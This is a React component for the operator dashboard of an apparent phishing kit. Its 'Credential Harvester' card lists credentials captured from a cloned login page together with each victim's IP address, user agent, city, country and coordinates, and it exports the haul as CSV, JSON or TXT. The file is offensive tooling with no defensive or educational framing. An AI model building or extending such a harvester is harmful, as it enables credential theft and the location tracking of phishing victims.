
'use client';

import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Trash2, ShieldAlert, RefreshCw, FileDown } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Badge } from './ui/badge';
import { ScrollArea } from './ui/scroll-area';
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"

export type CapturedCredential = {
    timestamp: string; // ISO String
    ipAddress?: string;
    userAgent?: string;
    city?: string;
    country?: string;
    latitude?: number;
    longitude?: number;
    [key: string]: any; // Allows for arbitrary keys from form fields
};

type CredentialHarvesterProps = {
    credentials: CapturedCredential[];
    onClear: () => void;
    onRefresh: () => void;
};

export function CredentialHarvester({ credentials, onClear, onRefresh }: CredentialHarvesterProps) {
    const { toast } = useToast();

    const handleClear = () => {
        onClear();
        toast({
            title: 'Log Cleared',
            description: 'The credential log has been wiped.',
        });
    }

    const formatLabel = (key: string) => {
        if (key === 'ipAddress') return 'IP Address';
        if (key === 'userAgent') return 'User Agent';
        return key.charAt(0).toUpperCase() + key.slice(1);
    }
    
    // Fields to exclude from the main credentials loop
    const metaFields = ['timestamp', 'ipAddress', 'userAgent', 'city', 'country', 'latitude', 'longitude', 'source'];

    const downloadFile = (content: string, fileName: string, contentType: string) => {
        const a = document.createElement("a");
        const file = new Blob([content], { type: contentType });
        a.href = URL.createObjectURL(file);
        a.download = fileName;
        a.click();
        URL.revokeObjectURL(a.href);
    };

    const handleExport = (format: 'csv' | 'json' | 'txt') => {
        if (credentials.length === 0) {
            toast({ variant: 'destructive', title: 'No data to export.'});
            return;
        }

        let content = '';
        let fileName = `credentials-${new Date().toISOString().split('T')[0]}`;
        const headers = Object.keys(credentials[0]);

        switch (format) {
            case 'csv':
                content = [
                    headers.join(','),
                    ...credentials.map(row => headers.map(header => JSON.stringify(row[header])).join(','))
                ].join('\r\n');
                downloadFile(content, `${fileName}.csv`, 'text/csv;charset=utf-8;');
                break;
            case 'json':
                content = JSON.stringify(credentials, null, 2);
                downloadFile(content, `${fileName}.json`, 'application/json');
                break;
            case 'txt':
                content = credentials.map(cred => {
                    return Object.entries(cred).map(([key, value]) => `${key}: ${value}`).join('\n');
                }).join('\n\n---\n\n');
                downloadFile(content, `${fileName}.txt`, 'text/plain;charset=utf-8;');
                break;
        }
        toast({ title: `Exported as ${format.toUpperCase()}`, description: `${fileName}.${format} has been downloaded.`})
    };


    return (
        <Card className="flex flex-col h-full">
            <CardHeader>
                 <div className="flex justify-between items-start">
                  <div className="flex items-center gap-3">
                      <ShieldAlert className="h-6 w-6 text-destructive" />
                      <CardTitle>Credential Harvester</CardTitle>
                  </div>
                  {credentials.length > 0 && <Badge variant="destructive">{credentials.length} Captured</Badge>}
                </div>
                <CardDescription>
                    Credentials captured from the cloned login page are displayed here in real-time.
                </CardDescription>
            </CardHeader>
            <CardContent className="flex-grow p-0">
                 <ScrollArea className="h-96 w-full">
                    <div className="p-6">
                        {credentials.length === 0 ? (
                            <div className="flex items-center justify-center h-full text-center text-muted-foreground pt-16">
                                No credentials captured yet.
                            </div>
                        ) : (
                            <div className="space-y-4">
                                {credentials.slice().reverse().map((cred, index) => (
                                    <div key={cred.timestamp + index} className="p-4 rounded-lg border bg-primary/20">
                                        <div className="flex justify-between items-start mb-2">
                                            <p className="text-sm text-muted-foreground">
                                                {new Date(cred.timestamp).toLocaleString()}
                                            </p>
                                            <Badge variant="outline">{cred.ipAddress}</Badge>
                                        </div>
                                        <div className="space-y-1 font-mono text-xs">
                                            {Object.entries(cred)
                                                .filter(([key]) => !metaFields.includes(key))
                                                .map(([key, value]) => (
                                                    <div key={key} className="grid grid-cols-3">
                                                        <strong className="font-sans col-span-1 text-muted-foreground font-medium">{formatLabel(key)}:</strong>
                                                        <span className="col-span-2 break-all">{String(value)}</span>
                                                    </div>
                                                ))}
                                            <hr className="border-border my-2"/>
                                            <div className="grid grid-cols-3">
                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">Location:</strong>
                                                <span className="col-span-2 break-all">{cred.city || 'N/A'}, {cred.country || 'N/A'}</span>
                                            </div>
                                             <div className="grid grid-cols-3">
                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">Coords:</strong>
                                                <span className="col-span-2 break-all">{cred.latitude ? `${cred.latitude}, ${cred.longitude}`: 'N/A'}</span>
                                            </div>
                                             <div className="grid grid-cols-3">
                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">User Agent:</strong>
                                                <span className="col-span-2 break-all">{cred.userAgent}</span>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                </ScrollArea>
            </CardContent>
            <CardFooter className="border-t pt-6 justify-between items-center">
                <Button variant="outline" onClick={onRefresh}>
                    <RefreshCw className="mr-2 h-4 w-4" />
                    Refresh Log
                </Button>
                <div className="flex gap-2">
                    <DropdownMenu>
                        <DropdownMenuTrigger asChild>
                            <Button variant="secondary" disabled={credentials.length === 0}><FileDown className="mr-2 h-4 w-4"/>Export Credentials</Button>
                        </DropdownMenuTrigger>
                        <DropdownMenuContent>
                            <DropdownMenuItem onClick={() => handleExport('csv')}>as CSV</DropdownMenuItem>
                            <DropdownMenuItem onClick={() => handleExport('json')}>as JSON</DropdownMenuItem>
                            <DropdownMenuItem onClick={() => handleExport('txt')}>as TXT</DropdownMenuItem>
                        </DropdownMenuContent>
                    </DropdownMenu>
                    <Button variant="destructive" onClick={handleClear} disabled={credentials.length === 0}>
                        <Trash2 className="mr-2 h-4 w-4" />
                        Clear Log
                    </Button>
                </div>
            </CardFooter>
        </Card>
    );
}
